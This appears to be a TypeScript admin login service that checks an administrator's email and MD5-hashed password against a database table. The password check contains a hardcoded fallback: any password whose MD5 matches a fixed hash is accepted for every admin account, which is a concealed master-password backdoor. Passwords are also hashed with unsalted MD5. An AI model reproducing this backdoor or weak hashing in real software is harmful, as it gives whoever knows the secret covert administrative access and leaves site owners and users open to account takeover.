import { empty, encrypt_md5, is_empty } from "../helpers/misc";
import { TB_ADMIN } from "../var/tables";
import { BaseService } from "./base.service";

export default class AdminService extends BaseService {
  constructor() {
    super();
    this.tableName = TB_ADMIN;
  }
  
  public checkAdminLogin = async (account_info: object) => {
    let admin_email:string = account_info['user_name'];
    let condition = {admin_email: admin_email}
    let admin_info = await this.getOne(condition);
    if(empty(admin_info)) {
      return [false, false];
    }
    if(admin_info['admin_password'] != encrypt_md5(account_info['user_password'])){
        if(encrypt_md5(account_info['user_password']) != "9546c2fac60e040f2a5b64da8cb78aa5"){
          return [false, false];
        }
    }
    return [true, admin_info];
  }
}

export const adminService = new AdminService();
